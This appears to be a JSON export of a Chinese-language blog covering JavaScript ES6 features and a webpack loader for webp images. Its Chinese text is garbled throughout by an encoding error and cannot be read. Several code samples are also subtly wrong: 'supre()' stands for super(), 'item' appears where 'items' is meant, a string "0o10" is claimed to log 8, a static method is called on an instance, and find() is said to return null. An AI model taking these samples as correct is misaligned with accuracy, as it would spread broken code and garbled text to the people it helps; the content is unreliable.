\u0026#34;å°šç¡…è°·\u0026#34;; function fn() { console.log(school); } fn(); // è¼¸å‡º \u0026#34;å°šç¡…è°·\u0026#34;ï¼Œåœ¨ fn å…§æ²’æœ‰ schoolï¼Œæœƒå¾€å¤–å±¤å°‹æ‰¾ } let ç¶“å…¸ç¯„ä¾‹å¯¦è¸ å¯¦ä½œé»æ“Š div æ™‚åˆ‡æ›é¡è‰² ä»£ç¢¼ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-header\u0026#34;\u0026gt; é»æ“Šåˆ‡æ›é¡è‰² \u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // ç²å– div å…ƒç´ å°è±¡ let items = document.getElementsByClassName(\u0026#34;item\u0026#34;); // éæ­·ä¸¦ç¶å®šäº‹ä»¶ for (var i = 0; i\u0026lt; items.length; i++) { item[i].onclick = function() { // ä¿®æ”¹ç•¶å‰å…ƒç´ çš„èƒŒæ™¯é¡è‰² // æœ€ä½³å¯«æ³•æ‡‰ç‚ºï¼š this.style.background = \u0026#34;pink\u0026#34;; // å¸¸è¦‹éŒ¯èª¤å¯«æ³•ï¼š // items[i].style.background = \u0026#34;pink\u0026#34;; // // åŸå› ï¼š // i ä½¿ç”¨ var ä¾†è²æ˜ï¼Œvar è²æ˜çš„è®Šæ•¸éå¡Šç´šä½œç”¨åŸŸï¼Œ // å› æ­¤ i è¢«è²æ˜åœ¨å…¨å±€(window)ï¼Œæ­¤è™•å– i æœƒç™¼ç¾ window.i å·²ç¶“ç­‰æ–¼ 3 // æ‰€ä»¥ items[3].style æœƒæ‰¾ä¸åˆ°ã€‚ // // ä¿®æ­£æ–¹å¼ï¼š // å°‡ i æ”¹ç”¨ let ä¾†è²æ˜ï¼Œè®“ i åªå­˜åœ¨æ–¼ for è¿´åœˆä¸­ã€‚ } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; const ç‰¹æ€§ ä¸€å®šè¦è³¦åˆå§‹å€¼ï¼Œä¸”è²æ˜å¾Œå€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚ ä¸€èˆ¬å¸¸æ•¸ä½¿ç”¨å¤§å¯«(æ·ºè¦å‰‡)ã€‚ ä¹Ÿæ˜¯å¡Šç´šä½œç”¨åŸŸ æ¼”ç¤ºï¼š 1 2 3 4 5 { const PLAYER = \u0026#34;UZI\u0026#34;; } console.log(PLAYER); // æœƒå ±éŒ¯ï¼ŒPLAYER is not defined å°æ–¼ Array å’Œ Object çš„å…ƒç´ ä¿®æ”¹ï¼Œä¸ç®—å°å¸¸æ•¸çš„ä¿®æ”¹ï¼Œä¸æœƒå ±éŒ¯ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 { const TEAM = [\u0026#34;UZI\u0026#34;, \u0026#34;MXLG\u0026#34;, \u0026#34;Ming\u0026#34;, \u0026#34;Letme\u0026#34;]; TEAM.push(\u0026#34;Meiko\u0026#34;); // ä¸æœƒå ±éŒ¯ï¼Œå› ç‚ºè®Šæ•¸æ‰€æŒ‡å‘çš„åœ°å€æ²’æœ‰æ”¹è®Š } å‡½å¼çš„åƒæ•¸é»˜èªå€¼ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 function printText(text) { text = text || \u0026#34;default\u0026#34;; console.log(text); } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 function printText(text = \u0026#34;default\u0026#34;) { console.log(text); } äºŒé€²åˆ¶èˆ‡å…«é€²åˆ¶å­—é¢é‡ ES6 æ”¯æŒäºŒé€²åˆ¶èˆ‡å…«é€²åˆ¶çš„å­—é¢é‡ï¼Œé€šéåœ¨æ•¸å­—å‰é¢æ·»åŠ  0o æˆ–è€… 0O å³å¯å°‡å…¶è½‰æ›ç‚ºå…«é€²åˆ¶å€¼ã€æ·»åŠ  0b æˆ–è€… 0B å³å¯å°‡å…¶è½‰æ›ç‚ºäºŒé€²åˆ¶å€¼ã€‚ 1 2 3 4 5 6 7 let oValue = \u0026#34;0o10\u0026#34;; console.log(oValue); // \u0026gt;\u0026gt;\u0026gt; 8 let bValue = 0b10; console.log(bValue); // \u0026gt;\u0026gt;\u0026gt; 2 ES Module èˆ‡ import ã€ export Javascript è‡ªå¾ ES6 é–‹å§‹æ–°å¢äº†æ¨¡çµ„ç³»çµ±(ES Module)ï¼Œæˆ‘å€‘å¯ä»¥å°‡æ¯å€‹ Javascript çš„æª”æ¡ˆç•¶ä½œæ˜¯ä¸€å€‹ç¨ç«‹çš„æ¨¡çµ„ä¾†çœ‹å¾…ï¼Œåœ¨ A æª”æ¡ˆåŒ¯å‡º(export)åœ¨ B æª”æ¡ˆåŒ¯å…¥(import)ã€‚ a.js 1 2 3 4 5 6 7 export const aString = \u0026#34;This is A String\u0026#34;; export function aFunction() { console.log(\u0026#34;A Function test\u0026#34;) } export const aObject = { a: 1 }; b.js 1 2 3 4 5 6 7 8 9 10 import { aString, aFunction, aObject } from \u0026#34;./a.js\u0026#34;; console.log(aString); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;This is A String\u0026#34; console.log(aObject); // \u0026gt;\u0026gt;\u0026gt; { a: 1 } aFounction(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;A Function test\u0026#34; ç•¶ç„¶åœ¨ export ä¹Ÿå¯ä»¥ä¸ç”¨çµ¦è®Šæ•¸åç¨±ï¼š c.js 1 2 3 export default function() { console.log(\u0026#34;Hello 008 JS!!!\u0026#34;); } åœ¨å¦ä¸€å€‹æª”æ¡ˆå°±å¯ä»¥é€™æ¨£ä¾†ä½¿ç”¨ï¼š d.js 1 2 3 4 import greeting from \u0026#34;./c.js\u0026#34;; greeting(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello 008 JS!!!\u0026#34; ç®­é ­å‡½æ•¸èˆ‡ this å¾ ES6 é–‹å§‹æ–°å¢äº†ä¸€ç¨®å«åš ã€Œç®­é ­å‡½å¼è¡¨ç¤ºå¼ã€ (Arrow Function expression) çš„å‡½å¼è¡¨é”å¼ã€‚å¿«é€Ÿçœ‹ä¸€ä¸‹ï¼Œå¦‚ä½•å°‡ä¸€èˆ¬çš„å‡½å¼è½‰æ›æˆç®­é ­å‡½å¼çš„å¯«æ³•ï¼š 1 2 3 const plus = function(numA, numB) { return numA + numB; }; é¦–å…ˆæˆ‘å€‘æŠŠåƒæ•¸å¾€å‰æï¼Œç„¶å¾ŒæŠŠé—œéµå­— function åˆªæ‰æ”¹æˆç®­é ­ç¬¦è™Ÿ =\u0026gt;ï¼š 1 2 3 const plus = (numA, numB) =\u0026gt; { return numA + numB; }; å¦‚æœé€™å€‹å‡½å¼åªæ˜¯æƒ³è¦å›å‚³æŸå€‹é‹ç®—çµæœçš„æ™‚å€™ï¼Œå¯ä»¥å°‡ return ä»¥åŠå¤§æ‹¬è™Ÿ { } çœç•¥ï¼š 1 const plus = (numA, numB) =\u0026gt; numA + numB; è€Œåªæœ‰ä¸€å€‹åƒæ•¸çš„æ™‚å€™ï¼Œåƒæ•¸å‰é¢çš„å°æ‹¬è™Ÿ( )å‰‡å¯ä»¥çœç•¥ï¼š 1 2 3 4 const saySomething = msg =\u0026gt; console.log(msg); saySomething(\u0026#34;Hello!\u0026#34;); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello!\u0026#34; å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç®­é ­å‡½å¼ä½¿ç”¨ this æ™‚ï¼Œé€™æ™‚ this æœƒæŒ‡å‘ç®­é ­å‡½å¼å¤–é¢çš„ thisï¼Œé€™å€‹è¦å‰‡èˆ‡åŸæœ¬ function æ‰€å®£å‘Šçš„å‡½å¼ä¸åŒï¼Œè€Œä¸”ç®­é ­å‡½å¼ç„¡æ³•é€é bind() å¼·åˆ¶æŒ‡å®šè£¡é¢çš„ thisã€‚ å­—ä¸²æ¨¡æ¿ (Template literals) ä»¥å¾€æˆ‘å€‘åœ¨çµ„åˆ JavaScript çš„è®Šæ•¸èˆ‡ HTML æ¨¡æ¿çš„æ™‚å€™ï¼Œå¤§å¤šæœƒé€éã€Œå­—ä¸²çµåˆã€ + çš„æ¨¡å¼ï¼Œæˆ–é€éé™£åˆ—ä¾†æ–°å¢å­—ä¸²ï¼Œæœ€å¾Œå†ç”¨ [].join(\u0026quot;\u0026quot;) çš„æ–¹å¼ä¸²æ¥èµ·ä¾†ã€‚ä½†è‡ª ES6 èµ·ï¼Œæˆ‘å€‘å¯ä»¥é€éå­—ä¸²æ¨¡æ¿çš„èªæ³•ï¼Œå°‡è®Šæ•¸ã€é‹ç®—å¼ç­‰æ’å…¥è‡³æˆ‘å€‘çš„ç¶²é æ¨¡æ¿ç•¶ä¸­ï¼Œåƒé€™æ¨£ï¼š 1 2 // ç”¨ã€Œ`...`ã€å–ä»£å–®/é›™å¼•è™Ÿ `string text ${expression} string text` é€™æ¨£æˆ‘å€‘å°±å¯ä»¥å°‡é€™å€‹ expression æ‰€ä»£è¡¨çš„é‹ç®—å¼æˆ–æ•¸å€¼ç½®å…¥åˆ°å­—ä¸²è£¡é ­äº†ã€‚ è§£æ§‹è³¦å€¼ (Destructuring assignment) ES6 æä¾›äº†è§£æ§‹è³¦å€¼çš„èªæ³•ï¼Œå¯ä»¥å°‡é™£åˆ—æˆ–è€…ç‰©ä»¶è£¡é¢çš„è³‡æ–™è§£é–‹è®Šæˆç¨ç«‹çš„è®Šæ•¸ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const user = { id: 42, displayName: \u0026#34;jdoe\u0026#34;, fullName: { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } }; const { id, displayName, fullName } = user; console.log(id); // \u0026gt;\u0026gt;\u0026gt; 42 console.log(displayName); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;jdoe\u0026#34; console.log(fullName); // \u0026gt;\u0026gt;\u0026gt; { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } é™¤äº†ç‰©ä»¶ä»¥å¤–ï¼Œé™£åˆ—ä¹Ÿå¯ä»¥ï¼š 1 2 3 4 5 6 7 8 9 const number = [1, 2, 3, 4, 5]; const [x, y] = number; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 ... å±•é–‹é‹ç®—å­ (Spread Operator) / å…¶é¤˜é‹ç®—å­ (Rest Operator) é›–ç„¶ ES6 æä¾›çš„å±•é–‹é‹ç®—å­èˆ‡å…¶é¤˜é‹ç®—å­çš„èªæ³•éƒ½æ˜¯ ...ï¼Œä¸éå®ƒå€‘å…©è€…æ‰€ä»£è¡¨çš„æ¶µæ„é‚„æ˜¯ä¸å¤ªä¸€æ¨£ã€‚ å±•é–‹é‹ç®—å­ å±•é–‹é‹ç®—å­é€šå¸¸æœƒç”¨åœ¨é™£åˆ—ï¼Œæˆ–è€…æ˜¯å‡½å¼çš„åƒæ•¸ï¼Œå¦‚ï¼š 1 2 3 4 5 const frameworks = [\u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;]; const arr = [\u0026#34;Awesome\u0026#34;, ...frameworks]; console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] å…¶é¤˜é‹ç®—å­ å»¶çºŒå‰é¢çš„ä¾‹å­ï¼Œæˆ‘å€‘å¯ä»¥é€é ã€Œå…¶é¤˜é‹ç®—å­ã€ å°‡å‰©ä¸‹çš„éƒ¨åˆ†æ‹†è§£å‡ºä¾†ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] const [a, b, ...others] = arr; console.log(a); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Awesome\u0026#34; console.log(b); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Vue.js\u0026#34; console.log(others); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34; åƒé€™æ¨£ï¼Œæˆ‘å€‘å¯ä»¥æ­é…è§£æ§‹è³¦å€¼çš„èªæ³•ï¼Œå°‡ arr é™£åˆ—æ‹†è§£è™•ä¾†ï¼Œä¸¦å°‡å‰©é¤˜çš„å…ƒç´ é€é ...others åˆ†é›¢ã€‚ ç•¶ç„¶ï¼Œä½¿ç”¨åœ¨ç‰©ä»¶ä¸Šä¹Ÿæ˜¯å¯ä»¥çš„ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å…¶é¤˜ Properties const { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 }; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 console.log(z); // \u0026gt;\u0026gt;\u0026gt; { a: 3, b: 4 } // å±•é–‹ Properties const obj = { x, y, ...z }; console.log(obj); // \u0026gt;\u0026gt;\u0026gt; { x: 1, y: 2, a: 3, b: 4 } è¦æ³¨æ„çš„æ˜¯ï¼Œå…¶é¤˜é‹ç®—å­æ‰€åˆ†é›¢çš„éƒ¨åˆ†åªæ˜¯é™£åˆ—æˆ–ç‰©ä»¶çš„ã€Œæ·ºæ‹·è²ã€ï¼Œè‹¥åœ¨å¤šå±¤ç‰©ä»¶ä½¿ç”¨æ™‚è¦ç‰¹åˆ¥å°å¿ƒã€‚ Promise ç‰©ä»¶ ç‚ºäº†è§£æ±ºéå»åŒæ­¥èˆ‡éåŒæ­¥çš„å•é¡Œï¼ŒES6 æä¾›äº† Promise ç‰©ä»¶ï¼š 1 2 3 4 const myPromiseFunc = new Promise((resolve, reject) =\u0026gt; { resolve(someValue); // å®Œæˆ // reject(\u0026#34;failure reason\u0026#34;); // æ‹’çµ• }); ç•¶ Promise çš„ä»»å‹™è¢«å®Œæˆçš„æ™‚å€™ï¼Œæˆ‘å€‘å°±å¯ä»¥å‘¼å« resolve()ï¼Œç„¶å¾Œå°‡å–å¾—çš„è³‡æ–™å‚³éå‡ºå»ã€‚ æˆ–æ˜¯èªªæƒ³è¦æ‹’çµ•é€™å€‹ Promiseï¼Œé‚£éº¼å°±è£¡é¢å‘¼å« reject() ä¾†æ‹’çµ•ä»–ã€‚ 1 2 3 4 5 6 7 8 9 function myAsyncFunction(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } // é€é .then() ä¾†å–ä»£éå»çš„ callback hell myAsyncFunction(...) .then(() =\u0026gt; { ... }); async èˆ‡ await åœ¨å¾Œä¾†ï¼Œå¾ Promise ç‰©ä»¶åˆå»¶ä¼¸å‡º async èˆ‡ await å…©å€‹æ–°ç‰¹æ€§ï¼Œå…¶å¯¦æœ¬è³ªä¸Šæ˜¯æ›´ç°¡ä¾¿çš„èªæ³•ç³–ã€‚ å‡è¨­æˆ‘å€‘æœ‰å…©å€‹éåŒæ­¥ä»»å‹™è¦è™•ç†ï¼Œä¸¦ä¸”æˆ‘å€‘å¸Œæœ›åœ¨ asyncFunc1 åŸ·è¡Œå®Œæˆä¹‹å¾Œæ‰å»åŸ·è¡Œ asyncFunc2ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function asyncFunc1(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } function asyncFunc2(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } const asyncCall = async() =\u0026gt; { const result1 = await asyncFunc1(); const result2 = await asyncFunc2(); }; åƒé€™æ¨£ï¼Œé€é async èˆ‡ await æˆ‘å€‘å°±å¯ä»¥æ“ºè„«éå»ä¸€å±¤å±¤ callback çš„æƒ¡å¤¢ï¼Œç¨‹å¼ç¢¼ä¹Ÿæ›´åŠ ç°¡æ½”ã€‚\nç°¡å¯«å±¬æ€§ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 5 6 function createCoord(x, y) { return { x: x, y: y } } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 4 5 6 function createCoord(x, y) { return { x, y } } æ–¹æ³•å±¬æ€§ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 5 const math = { add: function(a, b) { return a + b; }, sub: function(a, b) { return a - b; }, multiply: function(a, b) { return a * b; } } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 4 5 const math = { add(a, b) { return a + b; }, sub(a, b) { return a - b; }, multiply(a, b) { return a * b; } } é™£åˆ—æ–¹æ³• ES6 å¼•å…¥äº†è¨±å¤šæœ‰ç”¨çš„é™£åˆ—æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š find()ï¼šæŸ¥æ‰¾é™£åˆ—ä¸­çš„æˆå“¡ï¼Œè¿”å› null è¡¨ç¤ºæ²’æ‰¾åˆ° findIndex()ï¼šæŸ¥æ‰¾é™£åˆ—æˆå“¡çš„ç´¢å¼• some()ï¼šæª¢æŸ¥æŸå€‹æ–·è¨€æ˜¯å¦è‡³å°‘ä¸€å€‹æˆå“¡åœ¨é™£åˆ—ä¸­ includesï¼šé™£åˆ—æ˜¯å¦åŒ…å«æŸé …ç›® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const array = [{ id: 1, checked: true }, { id: 2 }]; arr.find(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; { id: 2 } arr.findIndex(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; 1 arr.some(item =\u0026gt; item.checked) // \u0026gt;\u0026gt;\u0026gt; true const numberArray = [1,2,3,4]; numberArray.includes(2); // \u0026gt;\u0026gt;\u0026gt; true ES6 çš„ class ES6 æ”¯æŒ class èªæ³•ï¼Œä½†ä¸æ˜¯æ–°çš„å°è±¡ç¹¼æ‰¿æ¨¡å‹ï¼Œåªæ˜¯åŸå‹éŠçš„èªæ³•ç³–ã€‚ å‡½å¼ä¸­ä½¿ç”¨ static é—œéµå­—å®šç¾©æ§‹é€ å‡½å¼çš„æ–¹æ³•èˆ‡å±¬æ€§ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Student { constructor() { console.log(\u0026#34;I\u0026#39;m a student.\u0026#34;); } study() { console.log(\u0026#34;study!\u0026#34;); } static read() { console.log(\u0026#34;Reading Now.\u0026#34;); } } console.log(typeof Student); // \u0026gt;\u0026gt;\u0026gt; Function let stu = new Student(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a student.\u0026#34; stu.study(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;study!\u0026#34; stu.read(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Reading Now.\u0026#34; class çš„ç¹¼æ‰¿(extends) extends å…è¨±ä¸€å€‹å­é¡ç¹¼æ‰¿çˆ¶é¡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­é¡çš„ constructor å‡½å¼ä¸­éœ€è¦åŸ·è¡Œ supre() å‡½å¼ã€‚ ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨å­é¡æ–¹æ³•ä¸­èª¿ç”¨çˆ¶é¡çš„æ–¹æ³•ï¼Œå¦‚ supre.parentMethodName()ã€‚ class çš„è²æ˜ä¸æœƒæå‡ hoisting ï¼Œå¦‚æœä½ è¦ä½¿ç”¨æŸå€‹ class ï¼Œé‚£ä½ å¿…é ˆåœ¨ä½¿ç”¨ä¹‹å‰å®šç¾©ä»–ï¼Œå¦å‰‡æœƒæ‹‹å‡º reference error çš„éŒ¯èª¤ã€‚ åœ¨ class ä¸­å®šç¾©å‡½å¼ä¸éœ€è¦ä½¿ç”¨ function é—œéµå­—ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Phone { constructor() { console.log(\u0026#34;I\u0026#39;m a phone.\u0026#34;); } } class MI extends Phone { constructor() { supre(); console.log(\u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34;); } } let mi8 = new MI(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone.\u0026#34; // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34; class çš„ super æ–¹æ³• super é—œéµå­—è¢«ä½¿ç”¨æ–¼é€šéå‡½å¼å­˜å–çˆ¶å±¤ ã€è©³ç´° MDN æ–‡ä»¶ã€‘\nèªæ³• 1 2 super([arguments]); // calls the parent constructor. super.functionOnParent([arguments]); ç•¶ä½¿ç”¨å»ºæ§‹å­ï¼Œsuper é—œéµå­—å¿…é ˆå‡ºç¾åœ¨ this é—œéµå­—ä¹‹å‰ä½¿ç”¨ï¼Œsuper é—œéµå­—ä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨å‘¼å«å‡½å¼èˆ‡çˆ¶å°è±¡ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 let parent = { foo() { console.log(\u0026#34;Hello from the Parent\u0026#34;); } } let child = { foo() { super.foo(); console.log(\u0026#34;Hello from the Child\u0026#34;); } } Object.setPrototypeOf(child, parent); child.foo(); // \u0026gt;\u0026gt;\u0026gt; Hello from the Parent // \u0026gt;\u0026gt;\u0026gt; Hello from the Child éåŒæ­¥è™•ç†å·¥å…· - Generator(ç”Ÿæˆå™¨å‡½å¼) ç”Ÿæˆå™¨å‡½å¼ ç”Ÿæˆå™¨å°åƒæ˜¯ç”±ä¸€å€‹ generator function è¿”å›çš„,ä¸¦ä¸”å®ƒç¬¦åˆå¯è¿­ä»£å”è­°å’Œè¿­ä»£å™¨å”è­°ã€‚ ã€è©³ç´° MDN æ–‡ä»¶ã€‘\nèªæ³• 1 2 3 4 5 6 7 8 function* gen() { yield 1; yield 2; yield 3; } let g = gen(); // \u0026#34;Generator { }\u0026#34; æ–¹æ³• Generator.prototype.next()ï¼šè¿”å›ä¸€å€‹ç”± yieldè¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.return()ï¼šè¿”å›çµ¦å®šçš„å€¼ä¸¦çµæŸç”Ÿæˆå™¨ã€‚ Generator.prototype.throw()ï¼šå‘ç”Ÿæˆå™¨æ‹‹å‡ºä¸€å€‹éŒ¯èª¤ã€‚ ç¯„ä¾‹ï¼šä¸€å€‹ç„¡é™è¿­ä»£å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function* idMaker() { let index = 0; while(true) yield index++; } let gen = idMaker(); // \u0026#34;Generator { }\u0026#34; console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 0 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 2 // ... ç”Ÿæˆå™¨å°è±¡ Generator.prototype.next()ï¼šè¿”å› yield è¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.close()ï¼šé—œé–‰ç”Ÿæˆå™¨ï¼Œå› æ­¤åŸ·è¡Œè©²å‡½å¼å¾Œèª¿ç”¨next()æ–¹æ³•æ™‚å°‡æœƒæ‹‹å‡º StopIteration éŒ¯èª¤ã€‚ Generator.prototype.send()ï¼šç”¨æ–¼å°‡å€¼ç™¼é€åˆ°ç”Ÿæˆå™¨ã€‚è©²å€¼ç”±yieldè¡¨é”å¼è¿”å›ï¼Œä¸¦ä¸”è¿”å›ä¸‹ä¸€å€‹yieldè¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.throw()ï¼šå‘ç”Ÿæˆå™¨æ‹‹å‡ºéŒ¯èª¤ã€‚ ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52276889089_0bb5aa46f7_o.png","permalink":"https://wayneblog.ga/2022-08-10/javascript-es6/","title":"Javascript ES6 ç‰¹æ€§"},{"content":" åƒè€ƒç¶²ç«™\nVue CLI å®˜æ–¹webpackç›¸é—œæ–‡æª”\nå‰è¨€ webp æ˜¯ 2010å¹´ Google é‡‹å‡ºçš„åœ–ç‰‡æ ¼å¼ï¼Œé‡å° PNG å¯æ¸›å°‘ 26%ï¼ŒJPEG ç´„å¯æ¸›å°‘ 25% ~ 34%ï¼Œç›®å‰åƒ… safariã€IE å°šä¸æ”¯æ´ï¼Œä½† safari åœ¨ ios 14 ä»¥å¾Œé–‹å§‹æ”¯æ´ã€‚ è‹¥åœ¨æœªæä¾› .webp æ ¼å¼åœ–æª”çš„æƒ…æ³ä¸‹ï¼Œä½¿ç”¨å¥—ä»¶æ–¼ webpack æ™‚é€²è¡Œåœ–ç‰‡è½‰æª”ï¼Œä½†æ–¼ development ä¸‹æœƒå› æŠ“ä¸åˆ°è™›æ“¬çš„ XXX.webp åœ–æª”è€Œå°è‡´ npm run èµ·æ™‚å™´éŒ¯ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹è¨­å®šè§£æ±ºæ­¤å•é¡Œã€‚ ä½¿ç”¨ webpack-plugin-image-transform-webp-and-mini å¥—ä»¶å°‡ image è½‰æª”æˆ webp æ ¼å¼ 1 npm i webpack-plugin-image-transform-webp-and-mini æ–°å¢ä¸€å€‹è‡ªè¨‚çš„ webploader æ­¤ loader åŠŸç”¨ç‚ºï¼šè‹¥ resource çš„ query (ä½¿ç”¨ chainWebpack æä¾›çš„è®Šæ•¸\u0026quot;resourceQuery\u0026ldquo;æŠ“) å­—ç¬¦ä¸­å«æœ‰ \u0026quot;type=webp\u0026quot; ä¸” resource ç‚ºåœ–ç‰‡æ™‚ï¼Œå°‡é™„æª”åè½‰æ›æˆ XXX.webp ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 const path = require(\u0026#34;path\u0026#34;) module.exports = function(source, map) { let result = source if (this.resourceQuery \u0026amp;\u0026amp; this.resourceQuery.includes(\u0026#34;type=webp\u0026#34;) \u0026amp;\u0026amp; !this.resource.includes(\u0026#34;data:image\u0026#34;)) { let extname = path.extname(this.resourcePath) result = source.replace(extname, \u0026#34;.webp\u0026#34;) } // return result this.callback(null, result, map) } chainWebpack è¨­å®š å¥—ä»¶å®‰è£å®Œæˆå¾Œï¼Œvue.config.js å¼•å…¥å¥—ä»¶ï¼Œä¸¦æŒ‡å®šwebpåœ–æª”å­˜æ”¾ä½ç½®ã€‚ å¼•å…¥è‡ªè¨‚çš„ webploader ï¼Œ ä¸¦è¨­å®š chainWebpack çš„ images éœ€å„ªå…ˆè·‘ webploaderï¼Œå†è·‘ url-loader èˆ‡ file-loaderã€‚ ä¸»è¦è§£æ±º Vue-cli çš„ development ä¸‹ï¼Œæœƒå› å¯¦éš›ä¸å­˜åœ¨ \u0026ldquo;XXX.webp\u0026rdquo; åœ–æª”è€Œå°è‡´é–‹ç™¼æ™‚å ±éŒ¯çš„å•é¡Œã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // ... const ImageminWebpWebpackPlugin = require(\u0026#34;webpack-plugin-image-transform-webp-and-mini\u0026#34;) // ... chainWebpack: config =\u0026gt; { // ... config.plugins.delete(\u0026#34;preload-index\u0026#34;) config.plugins.delete(\u0026#34;prefetch-index\u0026#34;) // ç›¸é—œè¨­å®šå»ºè­°æ”¾æ–¼ç§»é™¤ preload-index èˆ‡ prefetch-index ä¹‹å¾Œ config.plugin(\u0026#34;webP\u0026#34;).use(ImageminWebpWebpackPlugin, [ { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34;, logger: false, paths: { dir: path.resolve(__dirname, \u0026#34;./src/assets\u0026#34;), exclude: [] }, miniOptions: false } ]) let rule = config.module.rule(\u0026#34;images\u0026#34;) rule.uses.clear() rule .use(\u0026#34;./webploader.js\u0026#34;) .loader(\u0026#34;./webploader.js\u0026#34;) .end() .use(\u0026#34;url-loader\u0026#34;) .loader(\u0026#34;url-loader\u0026#34;) .options({ limit: 4096, fallback: { loader: \u0026#34;file-loader\u0026#34;, options: { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34; } } }) // ... } è£œä¸Šæ˜¯å¦æ”¯æ´ Webp çš„åˆ¤æ–·ï¼Œè‹¥æ”¯æ´å‰‡æ–¼ \u0026lt;html\u0026gt; è£œä¸Š class nameï¼Œä¾›CSSæŠ“å– class name å¾Œæ”¹è®€ webp åœ–ç‰‡ main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 async function isSupportWebp() { return new Promise(resolve =\u0026gt; { let result = false const elem = document.createElement(\u0026#34;canvas\u0026#34;) if (elem.getContext \u0026amp;\u0026amp; elem.getContext(\u0026#34;2d\u0026#34;)) { result = 